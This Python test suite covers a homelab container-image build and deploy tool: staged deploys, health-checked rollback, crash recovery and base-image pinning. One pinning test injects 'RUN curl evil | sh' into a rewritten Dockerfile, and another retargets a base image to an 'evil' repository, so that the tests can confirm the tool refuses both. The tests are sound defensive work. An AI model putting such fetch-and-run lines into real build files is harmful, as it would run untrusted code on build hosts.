import importlib.util
import hashlib
import io
import re
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tarfile
import tempfile
import time
import unittest
from unittest.mock import Mock, patch

TOOLS = Path(os.environ.get("HOMELAB_TEST_TOOLS", str(Path(__file__).parent)))
sys.path.insert(0, str(TOOLS))
import image_build

spec = importlib.util.spec_from_file_location("image_build_cli", TOOLS / "image-build.py")
cli = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = cli  # dataclasses resolve string annotations through sys.modules
spec.loader.exec_module(cli)

BUILDER = "image-builds"
OWNER = "example-owner"
REVISION = "a" * 40
CANDIDATE = "sha256:" + "2" * 64
OLD = "sha256:" + "1" * 64
OLDER = "sha256:" + "0" * 64
UNIT = "example.service"
CONTAINER = "Example"
STABLE = "localhost/example:stable"
PREVIOUS = "localhost/example:previous"
REV_LABEL = "org.opencontainers.image.revision"


class Crash(BaseException):
    """Restoration itself dies, so the journal must stay for `recover`."""


class Runtime:
    """Only process, OCI transfer, and service boundaries are simulated."""

    def __init__(self, case):
        self.case = case
        self.events = []
        self.clock = 0
        self.tags = {BUILDER: {}, OWNER: {STABLE: OLD, PREVIOUS: OLDER}}
        self.known = {BUILDER: set(), OWNER: {OLD, OLDER}}
        self.labels = {BUILDER: {}, OWNER: {OLD: {REV_LABEL: "b" * 40}, OLDER: {REV_LABEL: "c" * 40}}}
        self.units = {UNIT: "active"}
        self.containers = {CONTAINER: {"image": OLD, "running": True}}
        self.health = {OLD: "healthy", OLDER: "healthy", CANDIDATE: "healthy"}
        self.build_arguments = []
        self.build_timeouts = []
        self.context_entrypoint_mode = None
        self.dirty = False
        self.young = False
        self.build_failure = False
        self.label_mismatch = False
        self.start_failure = False
        self.pin_tamper = None

    def pin_response(self, raw):
        original = raw.decode()
        declared = re.findall(r"^FROM (?:--\S+ )*(\S+)", original, re.M)
        rewritten = original.replace("docker.io/example/base:1\n", "docker.io/example/base:1.2.3\n")
        response = {
            "schema": 1,
            "dockerfile_digest": "sha256:" + hashlib.sha256(raw).hexdigest(),
            "ok": True,
            "error": None,
            "changed": rewritten != original,
            "bases": [
                {
                    "declared": name,
                    "repository": "docker.io/example/base",
                    "reference": "1",
                    "status": "pin",
                    "chosen": "1.2.3",
                    "proposed": name.replace(":1", ":1.2.3") if name.endswith(":1") else name,
                    "eligible_at": 1_700_000_000.0,
                    "evidence": "docker-hub",
                    "downgrade": False,
                    "checked": 1,
                    "reason": "",
                }
                for name in declared
            ],
            "rewritten": rewritten,
        }
        if self.pin_tamper:
            self.pin_tamper(response)
        return response

    def result(self, returncode=0, stdout="", stderr=""):
        return subprocess.CompletedProcess([], returncode, stdout, stderr)

    def sleep(self, seconds):
        self.clock += seconds

    def monotonic(self):
        return self.clock

    def process(self, arguments, **kwargs):
        if arguments[0] != "git":
            raise AssertionError(f"unexpected process: {arguments}")
        if "status" in arguments:
            self.events.append("git-status")
            return self.result(stdout=" M changed\n" if self.dirty else "")
        if "rev-parse" in arguments:
            return self.result(stdout=REVISION + "\n")
        raise AssertionError(f"unexpected git operation: {arguments}")

    def archive(self, arguments, **kwargs):
        self.case.assertIn("archive", arguments)
        content = io.BytesIO()
        with tarfile.open(fileobj=content, mode="w") as archive:
            archive.add(self.case.checkout / "Dockerfile.source", arcname="Dockerfile.source")
            archive.add(self.case.checkout / "docker-entrypoint.sh", arcname="docker-entrypoint.sh")
        content.seek(0)
        process = Mock(stdout=content)
        process.wait.return_value = 0
        process.poll.return_value = 0
        return process

    def transfer(self, source, target, image):
        self.case.assertEqual((source, target), (BUILDER, OWNER))
        self.events.append("transfer")
        identity = self.resolve(BUILDER, image)
        self.known[OWNER].add(identity)
        labels = dict(self.labels[BUILDER][identity])
        if self.label_mismatch:
            labels[REV_LABEL] = "f" * 40
        self.labels[OWNER][identity] = labels
        return identity

    def resolve(self, role, reference):
        if reference in self.tags[role]:
            return self.tags[role][reference]
        return reference if reference in self.known[role] else None

    def run_as(self, role, arguments, **kwargs):
        if arguments[0] == "systemctl":
            self.case.assertEqual(role, OWNER)
            self.case.assertEqual(arguments[1], "--user")
            return self.systemctl(*arguments[2:])
        if arguments[0] == "podman":
            if arguments[1] == "build":
                self.build_timeouts.append(kwargs.get("timeout"))
            return self.podman(role, *arguments[1:])
        if arguments[0] == "image_update":
            self.case.assertEqual(role, "image-updates")
            if arguments[1] == "pin":
                self.case.assertEqual(arguments[2:], ["--dockerfile-stdin", "--json"])
                self.events.append("pin")
                return self.result(stdout=json.dumps(self.pin_response(kwargs["input"])).encode(), stderr=b"")
            self.case.assertEqual(arguments[1], "inputs")
            aged = "--require-aged" in arguments
            self.events.append("authorize:aged" if aged else "authorize:observe")
            if self.young and aged:
                return self.result(1, stdout=b"", stderr=b"Base image docker.io/example/base:1 is not seven-day eligible")
            return self.result(
                stdout=json.dumps({"specification": self.case.specification, "rendered": self.case.rendered}).encode(),
                stderr=b"",
            )
        raise AssertionError(f"unexpected principal process: {role} {arguments}")

    def systemctl(self, operation, *arguments):
        unit = arguments[-1]
        self.case.assertEqual(unit, UNIT)
        if operation == "show":
            return self.result(stdout=self.units[unit] + "\n")
        if operation == "reset-failed":
            return self.result()
        if operation == "stop":
            self.events.append("stop")
            self.units[unit] = "inactive"
            for container in self.containers.values():
                container["running"] = False
            return self.result()
        if operation == "start":
            if self.start_failure:
                return self.result(1, stderr="start refused")
            image = self.resolve(OWNER, STABLE)
            self.events.append("start:" + str(image))
            self.units[unit] = "active"
            self.containers[CONTAINER] = {"image": image, "running": True}
            return self.result()
        raise AssertionError(f"unexpected service operation: {operation}")

    def podman(self, role, *arguments):
        if arguments[:2] == ("image", "exists"):
            reference = arguments[-1]
            if "@sha256:" in reference:
                return self.result()
            return self.result(0 if self.resolve(role, reference) else 1)
        if arguments[:2] == ("image", "inspect"):
            identity = self.resolve(role, arguments[-1])
            if identity is None:
                return self.result(1, stderr="image missing")
            template = arguments[3]
            if template == "{{json .Labels}}":
                return self.result(stdout=json.dumps(self.labels[role].get(identity, {})))
            if "index .Labels" in template:
                return self.result(stdout=self.labels[role].get(identity, {}).get(REV_LABEL, "") + "\n")
            return self.result(stdout=identity + "\n")
        if arguments[0] == "build":
            self.case.assertEqual(role, BUILDER)
            self.case.assertIn("--pull=never", arguments)
            self.events.append("build")
            self.build_arguments.append(arguments)
            entrypoint = Path(arguments[-1]) / "docker-entrypoint.sh"
            self.context_entrypoint_mode = stat.S_IMODE(entrypoint.stat().st_mode)
            if self.build_failure:
                return self.result(1, stderr="build failed")
            labels = {}
            for index, argument in enumerate(arguments):
                if argument == "--label":
                    key, _, value = arguments[index + 1].partition("=")
                    labels[key] = value
            self.tags[BUILDER][arguments[arguments.index("-t") + 1]] = CANDIDATE
            self.known[BUILDER].add(CANDIDATE)
            self.labels[BUILDER][CANDIDATE] = labels
            return self.result()
        self.case.assertEqual(role, OWNER)
        if arguments[0] == "tag":
            identity = self.resolve(role, arguments[1])
            if identity is None:
                return self.result(1, stderr="image missing")
            self.events.append(f"tag:{arguments[2].rsplit(':', 1)[1]}={identity}")
            self.tags[role][arguments[2]] = identity
            return self.result()
        if arguments[0] == "untag":
            self.events.append("untag:" + arguments[2].rsplit(":", 1)[1])
            self.tags[role].pop(arguments[2], None)
            return self.result()
        if arguments[0] == "rm":
            name = arguments[-1]
            if name in self.containers:
                if self.containers[name]["running"]:
                    return self.result(1, stderr="container is running")
                del self.containers[name]
            self.events.append("rm")
            return self.result()
        if arguments[0] == "inspect":
            container = self.containers.get(arguments[-1])
            if container is None:
                return self.result(1, stderr="no such container")
            status = self.health.get(container["image"], "healthy") if container["running"] else ""
            return self.result(stdout=f"{status}|{'true' if container['running'] else 'false'}\n")
        raise AssertionError(f"unexpected OCI operation: {arguments}")


class ImageBuildCase(unittest.TestCase):
    serve = True
    revision_build_arg = None

    def setUp(self):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name).resolve()
        self.checkout = self.root / "checkout"
        (self.checkout / ".git").mkdir(parents=True)
        (self.checkout / "Dockerfile.source").write_text("FROM docker.io/example/base:1\n")
        entrypoint = self.checkout / "docker-entrypoint.sh"
        entrypoint.write_text("#!/bin/sh\n")
        entrypoint.chmod(0o755)
        self.recovery = self.root / "journal"
        self.specification = {
            "schema": 1,
            "dockerfile_digest": image_build.dockerfile_digest(self.checkout / "Dockerfile.source"),
            "images": {"docker.io/example/base:1": {"reference": "docker.io/example/base@sha256:" + "3" * 64}},
        }
        self.rendered = "FROM docker.io/example/base@sha256:" + "3" * 64 + "\n"
        entry = {
            "repository": "localhost/example",
            "checkout": str(self.checkout),
            "dockerfile": "Dockerfile.source",
            "principal": OWNER,
            "unit": UNIT,
            "container": CONTAINER,
            "serve": self.serve,
        }
        if self.revision_build_arg:
            entry["revisionBuildArg"] = self.revision_build_arg
        self.document = {"schema": 1, "builder": BUILDER, "recovery": str(self.recovery), "images": {"example": entry}}
        self.spec = cli.parse_spec(self.document)
        self.runtime = Runtime(self)
        if not self.serve:
            self.runtime.units[UNIT] = "inactive"
            self.runtime.containers.clear()
        identity = {"uid": os.geteuid(), "gid": os.getegid(), "home": str(self.root)}
        patches = [
            patch.object(cli, "load_spec", return_value=self.spec),
            patch.object(cli, "require_admin"),
            patch.object(cli, "principal", return_value=identity),
            patch.object(cli, "principal_for_unit", return_value=OWNER),
            patch.object(cli, "tool", side_effect=lambda name: name),
            patch.object(cli, "run_as", side_effect=self.runtime.run_as),
            patch.object(image_build, "principal", return_value=identity),
            patch.object(image_build, "tool", side_effect=lambda name: name),
            patch.object(image_build, "run_as", side_effect=self.runtime.run_as),
            patch.object(image_build, "stream_image", side_effect=self.runtime.transfer),
            patch.dict(os.environ, {"HOMELAB_SIGNATURE_POLICY": "/policy.json"}),
            patch.object(cli.os, "getuid", return_value=0),
            patch.object(cli.os, "chdir"),
            patch.object(cli.os, "umask"),
            patch.object(time, "monotonic", side_effect=self.runtime.monotonic),
            patch.object(time, "sleep", side_effect=self.runtime.sleep),
            patch.object(subprocess, "run", side_effect=self.runtime.process),
            patch.object(subprocess, "Popen", side_effect=self.runtime.archive),
        ]
        for patched in patches:
            patched.start()
            self.addCleanup(patched.stop)
        self.journal = cli.Journal(self.recovery, "example")

    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with patch.object(sys, "stdout", out), patch.object(sys, "stderr", err):
            code = cli.main(list(argv))
        return code, out.getvalue(), err.getvalue()

    def index(self, event):
        return self.runtime.events.index(event)

    def tag(self, reference):
        return self.runtime.tags[OWNER].get(reference)

    def assert_untouched(self):
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertEqual(self.tag(PREVIOUS), OLDER)
        self.assertNotIn("stop", self.runtime.events)
        self.assertIsNone(self.journal.pending())


class DeployTests(ImageBuildCase):
    def test_serving_deploy_switches_stable_and_waits_for_health(self):
        code, out, _ = self.run_cli("deploy", "example")
        self.assertEqual(code, 0, out)
        events = self.runtime.events
        order = ["authorize:aged", "build", "transfer", "stop", f"tag:previous={OLD}", f"tag:stable={CANDIDATE}", "rm"]
        positions = [self.index(event) for event in order]
        self.assertEqual(positions, sorted(positions))
        self.assertLess(self.index("rm"), self.index(f"start:{CANDIDATE}"))
        self.assertEqual(self.tag(STABLE), CANDIDATE)
        self.assertEqual(self.tag(PREVIOUS), OLD)
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], CANDIDATE)
        self.assertIsNone(self.journal.pending())
        last = self.journal.last()
        self.assertEqual((last["rev"], last["image"], last["phase"]), (REVISION, CANDIDATE, "activated"))
        self.assertEqual(stat.S_IMODE((self.recovery / "example").stat().st_mode), 0o700)
        self.assertEqual(events.count("build"), 1)
        # Without a revision build arg the candidate build never receives one.
        self.assertNotIn("--build-arg", self.runtime.build_arguments[0])
        self.assertIn(f"{image_build.REVISION_LABEL}={REVISION}", self.runtime.build_arguments[0])

    def test_second_deploy_reuses_cached_candidate(self):
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        self.assertEqual(self.runtime.events.count("build"), 1)

    def test_first_deploy_without_previous_image(self):
        for reference in (STABLE, PREVIOUS):
            del self.runtime.tags[OWNER][reference]
        self.runtime.units[UNIT] = "inactive"
        self.runtime.containers.clear()
        code, _, _ = self.run_cli("deploy", "example")
        self.assertEqual(code, 0)
        self.assertEqual(self.tag(STABLE), CANDIDATE)
        self.assertNotIn(PREVIOUS, self.runtime.tags[OWNER])
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertFalse(any(event.startswith("tag:previous") for event in self.runtime.events))

    def test_failed_first_deploy_removes_stable_and_leaves_unit_stopped(self):
        for reference in (STABLE, PREVIOUS):
            del self.runtime.tags[OWNER][reference]
        self.runtime.units[UNIT] = "inactive"
        self.runtime.containers.clear()
        self.runtime.health[CANDIDATE] = "unhealthy"
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertNotIn(STABLE, self.runtime.tags[OWNER])
        self.assertEqual(self.runtime.units[UNIT], "inactive")
        self.assertIn("left stopped", err)
        self.assertIsNone(self.journal.pending())

    def test_build_failure_leaves_runtime_untouched(self):
        self.runtime.build_failure = True
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("podman build", err)
        self.assert_untouched()
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertNotIn("transfer", self.runtime.events)

    def test_unhealthy_candidate_restores_previous_image_and_fails(self):
        self.runtime.health[CANDIDATE] = "unhealthy"
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("did not become healthy", err)
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertEqual(self.tag(PREVIOUS), OLDER)
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], OLD)
        self.assertIsNone(self.journal.pending())
        self.assertIn("restored", err)

    def test_start_failure_restores_previous_image(self):
        self.runtime.start_failure = True
        original = self.runtime.systemctl

        def heal(operation, *arguments):
            if operation == "start" and self.tag(STABLE) == OLD:
                self.runtime.start_failure = False
            return original(operation, *arguments)

        with patch.object(self.runtime, "systemctl", side_effect=heal):
            code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("could not start", err)
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertEqual(self.runtime.units[UNIT], "active")

    def test_container_without_healthcheck_must_stay_running(self):
        self.runtime.health[CANDIDATE] = ""
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        self.assertGreaterEqual(self.runtime.clock, image_build_running_proof())

    def test_container_that_exits_without_healthcheck_fails_deploy(self):
        self.runtime.health[CANDIDATE] = ""
        original = self.runtime.systemctl

        def crashing(operation, *arguments):
            result = original(operation, *arguments)
            if operation == "start" and self.tag(STABLE) == CANDIDATE:
                self.runtime.containers[CONTAINER]["running"] = False
            return result

        with patch.object(self.runtime, "systemctl", side_effect=crashing):
            code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("did not become healthy", err)
        self.assertEqual(self.tag(STABLE), OLD)

    def test_dirty_checkout_is_refused_before_anything_changes(self):
        self.runtime.dirty = True
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("dirty", err)
        self.assertEqual(self.runtime.events, ["git-status"])
        self.assert_untouched()

    def test_young_bases_are_refused_before_build_or_stop(self):
        self.runtime.young = True
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("not seven-day eligible", err)
        self.assertNotIn("build", self.runtime.events)
        self.assertNotIn("transfer", self.runtime.events)
        self.assert_untouched()
        self.assertEqual(self.runtime.units[UNIT], "active")

    def test_label_mismatch_after_transfer_is_refused_before_stop(self):
        self.runtime.label_mismatch = True
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("did not preserve provenance labels", err)
        self.assert_untouched()
        self.assertEqual(self.runtime.units[UNIT], "active")

    def test_missing_dockerfile_marker_rejects_checkout(self):
        (self.checkout / "Dockerfile.source").unlink()
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("Dockerfile.source", err)
        self.assert_untouched()

    def test_stage_only_authorizes_without_building_or_requiring_age(self):
        self.runtime.young = True
        code, out, _ = self.run_cli("stage", "example")
        self.assertEqual(code, 0)
        self.assertIn("Warmed upstream bases", out)
        self.assertEqual(self.runtime.events, ["git-status", "authorize:observe"])

    def test_interrupt_restores_and_signals_interruption(self):
        original = self.runtime.systemctl

        def interrupted(operation, *arguments):
            if operation == "start" and self.tag(STABLE) == CANDIDATE:
                raise KeyboardInterrupt
            return original(operation, *arguments)

        with patch.object(self.runtime, "systemctl", side_effect=interrupted):
            code, _, _ = self.run_cli("deploy", "example")
        self.assertEqual(code, 130)
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertIsNone(self.journal.pending())


def image_build_running_proof():
    return cli.RUNNING_PROOF


class StageOnlyTests(ImageBuildCase):
    serve = False

    def test_deploy_tags_stable_without_touching_the_unit(self):
        code, out, _ = self.run_cli("deploy", "example")
        self.assertEqual(code, 0)
        self.assertIn("staged", out)
        self.assertEqual(self.tag(STABLE), CANDIDATE)
        self.assertEqual(self.tag(PREVIOUS), OLD)
        self.assertEqual(self.runtime.units[UNIT], "inactive")
        self.assertFalse(
            any(event in ("stop", "rm") or event.startswith("start:") for event in self.runtime.events)
        )
        self.assertIsNone(self.journal.pending())
        self.assertEqual(self.journal.last()["image"], CANDIDATE)


class PinTests(ImageBuildCase):
    PATCH = (
        "--- a/Dockerfile.source\n+++ b/Dockerfile.source\n@@ -1 +1 @@\n"
        "-FROM docker.io/example/base:1\n+FROM docker.io/example/base:1.2.3\n"
    )

    def dockerfile(self):
        return self.checkout / "Dockerfile.source"

    def test_prints_only_the_patch_and_writes_nothing(self):
        before = self.dockerfile().read_bytes()
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual(code, 0, err)
        self.assertEqual(out, self.PATCH)
        self.assertIn("docker.io/example/base:1 -> docker.io/example/base:1.2.3  usable from 2023-11-14 (docker-hub)", err)
        self.assertIn("deployable now", err)
        self.assertIn(f"apply with: sudo homelab-image-build pin example | git -C {self.checkout} apply", err)
        self.assertEqual(self.dockerfile().read_bytes(), before)
        self.assertEqual(self.runtime.events, ["pin"])
        self.assertFalse(self.recovery.exists())
        self.assertIsNone(self.journal.pending())

    def test_a_proposal_that_is_not_deployable_exits_one_but_still_prints_the_patch(self):
        def refuse(response):
            response.update(ok=False, error="Base image docker.io/example/base:1.2.3 is not seven-day eligible")

        self.runtime.pin_tamper = refuse
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual(code, 1)
        self.assertEqual(out, self.PATCH)
        self.assertIn("NOT deployable now: Base image docker.io/example/base:1.2.3 is not seven-day eligible", err)

    def test_a_downgrade_is_marked(self):
        self.runtime.pin_tamper = lambda response: response["bases"][0].update(downgrade=True)
        self.assertIn("DOWNGRADE", self.run_cli("pin", "example")[2])

    def test_nothing_to_change_prints_no_patch_and_succeeds(self):
        self.dockerfile().write_text("FROM docker.io/example/base:1.2.3\n")
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual((code, out), (0, ""))
        self.assertNotIn("apply with", err)

    def test_a_response_for_other_bytes_is_refused(self):
        self.runtime.pin_tamper = lambda response: response.update(dockerfile_digest="sha256:" + "0" * 64)
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual((code, out), (1, ""))
        self.assertIn("does not match the working-tree Dockerfile", err)

    def test_a_rewrite_outside_from_lines_is_refused(self):
        self.dockerfile().write_text("FROM docker.io/example/base:1\nRUN make\n")
        self.runtime.pin_tamper = lambda response: response.update(
            rewritten=response["rewritten"].replace("RUN make", "RUN curl evil | sh")
        )
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual((code, out), (1, ""))
        self.assertIn("line 2", err)
        self.assertIn("not a FROM line", err)

    def test_a_rewrite_that_changes_the_line_count_is_refused(self):
        self.runtime.pin_tamper = lambda response: response.update(rewritten=response["rewritten"] + "RUN evil\n")
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual((code, out), (1, ""))
        self.assertIn("line count", err)


class PinRetargetTests(ImageBuildCase):
    def propose(self, dockerfile, tamper=None, bases=None):
        (self.checkout / "Dockerfile.source").write_text(dockerfile)

        def apply(response):
            if bases is not None:
                response["bases"] = bases(response["bases"])
            if tamper:
                response["rewritten"] = tamper(response["rewritten"])

        self.runtime.pin_tamper = apply
        return self.run_cli("pin", "example")

    def test_a_tag_change_and_registry_qualification_pass(self):
        dockerfile = "FROM --platform=linux/amd64 node:1 AS client  # build\nFROM docker.io/example/base:1\n"
        (self.checkout / "Dockerfile.source").write_text(dockerfile)

        def qualify(response):
            response["bases"][0]["proposed"] = "docker.io/library/node:1.2.3"
            response["rewritten"] = response["rewritten"].replace(
                "node:1 AS", "docker.io/library/node:1.2.3 AS"
            )

        self.runtime.pin_tamper = qualify
        code, out, err = self.run_cli("pin", "example")
        self.assertEqual(code, 0, err)
        self.assertIn("+FROM --platform=linux/amd64 docker.io/library/node:1.2.3 AS client  # build\n", out)

    def test_a_different_repository_is_refused(self):
        code, out, err = self.propose(
            "FROM docker.io/library/node:1\n",
            tamper=lambda text: text.replace("library/node:1", "evil/node:1"),
            bases=lambda bases: [dict(bases[0], proposed="docker.io/evil/node:1")],
        )
        self.assertEqual((code, out), (1, ""))
        self.assertIn("retargets docker.io/library/node:1 to repository docker.io/evil/node", err)

    def test_a_changed_stage_alias_is_refused(self):
        code, out, err = self.propose(
            "FROM docker.io/example/base:1 AS client\n", tamper=lambda text: text.replace("AS client", "AS evil")
        )
        self.assertEqual((code, out), (1, ""))
        self.assertIn("line 1", err)

    def test_a_changed_platform_flag_is_refused(self):
        code, out, err = self.propose(
            "FROM --platform=linux/amd64 docker.io/example/base:1\n",
            tamper=lambda text: text.replace("linux/amd64", "linux/arm64"),
        )
        self.assertEqual((code, out), (1, ""))
        self.assertIn("line 1", err)

    def test_a_base_the_dockerfile_does_not_declare_is_refused(self):
        code, out, err = self.propose(
            "FROM docker.io/example/base:1\n",
            bases=lambda bases: bases + [dict(bases[0], declared="docker.io/other/app:2", proposed="docker.io/other/app:2.1")],
        )
        self.assertEqual((code, out), (1, ""))
        self.assertIn("docker.io/other/app:2, which the Dockerfile does not declare", err)


class RevisionBuildArgumentTests(ImageBuildCase):
    revision_build_arg = "SOURCE_REVISION"

    def test_build_receives_the_committed_revision(self):
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        arguments = self.runtime.build_arguments[0]
        self.assertEqual(arguments[arguments.index("--build-arg") + 1], f"SOURCE_REVISION={REVISION}")

    def test_build_context_keeps_committed_entrypoint_permissions(self):
        # Build tools copy context modes into the image. Squeezing the
        # committed 0755 entrypoint to owner-only bits leaves a non-root
        # container user able to execute but not read it, so bash fails
        # with "Permission denied" before the entrypoint runs.
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        self.assertEqual(self.runtime.context_entrypoint_mode, 0o755)


class BuildTimeoutTests(ImageBuildCase):
    def test_a_from_source_build_is_not_killed_by_the_default_limit(self):
        # SilverBullet's Rust compile alone runs ~15 minutes; the library's 600s
        # default would abort every real deploy mid-build.
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        self.assertEqual(self.runtime.build_timeouts, [cli.BUILD_TIMEOUT])
        self.assertGreaterEqual(cli.BUILD_TIMEOUT, 3600)

    def test_other_consumers_keep_the_short_default(self):
        target = image_build.BuildTarget(
            name="t", repository="localhost/t", checkout=Path("/x"), dockerfile="Dockerfile",
            builder="b", owner="o", label_namespace="io.homelab.t", markers=("Dockerfile",),
        )
        self.assertEqual(target.build_timeout, 600)


class RecoveryTests(ImageBuildCase):
    def crash_after_failed_deploy(self):
        """Candidate unhealthy and the process dies before restore can run."""
        self.runtime.health[CANDIDATE] = "unhealthy"
        with patch.object(cli, "restore", side_effect=Crash):
            self.assertEqual(self.run_cli("deploy", "example")[0], 1)

    def test_interrupted_deploy_stays_pending_and_recover_restores(self):
        self.crash_after_failed_deploy()
        pending = self.journal.pending()
        self.assertEqual((pending["phase"], pending["previous"], pending["candidate"]), ("switching", OLD, CANDIDATE))
        self.assertEqual(self.tag(STABLE), CANDIDATE)
        code, _, err = self.run_cli("recover", "example")
        self.assertEqual(code, 0, err)
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertEqual(self.tag(PREVIOUS), OLDER)
        self.assertEqual(self.runtime.units[UNIT], "active")
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], OLD)
        self.assertIsNone(self.journal.pending())

    def test_pending_journal_blocks_every_other_mutation(self):
        self.crash_after_failed_deploy()
        events = list(self.runtime.events)
        for command in ("deploy", "rollback", "stage"):
            with self.subTest(command=command):
                code, _, err = self.run_cli(command, "example")
                self.assertEqual(code, 1)
                self.assertIn("homelab-image-build recover example", err)
        self.assertEqual(self.runtime.events, events)
        code, out, _ = self.run_cli("status", "example")
        self.assertEqual(code, 0)
        self.assertIn("pending:", out)
        self.assertEqual(self.run_cli("list")[0], 0)

    def test_failed_restore_keeps_journal_and_names_recover(self):
        self.runtime.health[CANDIDATE] = "unhealthy"
        self.runtime.health[OLD] = "unhealthy"
        code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("homelab-image-build recover example", err)
        self.assertIsNotNone(self.journal.pending())
        self.runtime.health[OLD] = "healthy"
        code, _, err = self.run_cli("recover", "example")
        self.assertEqual(code, 0, err)
        self.assertEqual(self.tag(STABLE), OLD)
        self.assertIsNone(self.journal.pending())

    def test_recover_without_journal_is_a_no_op(self):
        code, out, _ = self.run_cli("recover", "example")
        self.assertEqual(code, 0)
        self.assertIn("No interrupted", out)
        self.assertEqual(self.runtime.events, [])

    def test_recover_of_first_deploy_removes_the_new_stable_tag(self):
        for reference in (STABLE, PREVIOUS):
            del self.runtime.tags[OWNER][reference]
        self.runtime.units[UNIT] = "inactive"
        self.runtime.containers.clear()
        self.runtime.health[CANDIDATE] = "unhealthy"
        with patch.object(cli, "restore", side_effect=Crash):
            self.assertEqual(self.run_cli("deploy", "example")[0], 1)
        self.assertEqual(self.journal.pending()["previous"], None)
        self.assertEqual(self.run_cli("recover", "example")[0], 0)
        self.assertNotIn(STABLE, self.runtime.tags[OWNER])
        self.assertEqual(self.runtime.units[UNIT], "inactive")

    def test_concurrent_operation_is_refused(self):
        with self.journal.lock():
            code, _, err = self.run_cli("deploy", "example")
        self.assertEqual(code, 1)
        self.assertIn("lock", err)
        self.assertEqual(self.runtime.events, [])


class RollbackTests(ImageBuildCase):
    def test_rollback_swaps_stable_and_previous_and_second_goes_forward(self):
        code, _, err = self.run_cli("rollback", "example")
        self.assertEqual(code, 0, err)
        self.assertEqual((self.tag(STABLE), self.tag(PREVIOUS)), (OLDER, OLD))
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], OLDER)
        self.assertEqual(self.journal.last()["operation"], "rollback")
        self.assertEqual(self.journal.last()["rev"], "c" * 40)
        self.assertEqual(self.run_cli("rollback", "example")[0], 0)
        self.assertEqual((self.tag(STABLE), self.tag(PREVIOUS)), (OLD, OLDER))
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], OLD)
        self.assertNotIn("build", self.runtime.events)

    def test_rollback_requires_a_previous_image(self):
        del self.runtime.tags[OWNER][PREVIOUS]
        code, _, err = self.run_cli("rollback", "example")
        self.assertEqual(code, 1)
        self.assertIn("nothing to roll back", err)
        self.assertNotIn("stop", self.runtime.events)

    def test_failed_rollback_restores_the_original_pair(self):
        self.runtime.health[OLDER] = "unhealthy"
        code, _, _ = self.run_cli("rollback", "example")
        self.assertEqual(code, 1)
        self.assertEqual((self.tag(STABLE), self.tag(PREVIOUS)), (OLD, OLDER))
        self.assertEqual(self.runtime.containers[CONTAINER]["image"], OLD)
        self.assertIsNone(self.journal.pending())


class StatusTests(ImageBuildCase):
    def test_status_reports_images_unit_and_health(self):
        self.assertEqual(self.run_cli("deploy", "example")[0], 0)
        code, out, _ = self.run_cli("status")
        self.assertEqual(code, 0)
        self.assertIn(f"rev {REVISION[:12]}", out)
        self.assertIn("rev " + "b" * 12, out)
        self.assertIn("unit:     active", out)
        self.assertIn("health:   healthy", out)
        self.assertIn("deploy " + REVISION[:12], out)

    def test_list_names_declared_images(self):
        code, out, _ = self.run_cli("list")
        self.assertEqual(code, 0)
        self.assertEqual(out.split("\t")[:3], ["example", STABLE, UNIT])


class SpecTests(unittest.TestCase):
    def document(self, **changes):
        entry = {
            "repository": "localhost/example",
            "checkout": "/home/example/example",
            "dockerfile": "Dockerfile.source",
            "principal": OWNER,
            "unit": UNIT,
            "container": CONTAINER,
            "serve": True,
        }
        entry.update(changes)
        return {"schema": 1, "builder": BUILDER, "recovery": "/var/lib/homelab/image-builds", "images": {"example": entry}}

    def test_valid_spec_builds_targets(self):
        parsed = cli.parse_spec(self.document())
        target = parsed.images["example"].target
        self.assertEqual(
            (target.repository, target.builder, target.owner, target.dockerfile, target.markers),
            ("localhost/example", BUILDER, OWNER, "Dockerfile.source", ("Dockerfile.source",)),
        )
        self.assertIsNone(target.revision_build_arg)

    def test_invalid_entries_are_rejected(self):
        for changes in (
            {"repository": "docker.io/example"},
            {"checkout": "relative/path"},
            {"dockerfile": "../Dockerfile"},
            {"dockerfile": "/abs/Dockerfile"},
            {"unit": "example.container"},
            {"serve": "yes"},
            {"container": "bad name"},
            {"revisionBuildArg": "not-valid"},
        ):
            with self.subTest(changes=changes), self.assertRaises(image_build.BuildError):
                cli.parse_spec(self.document(**changes))
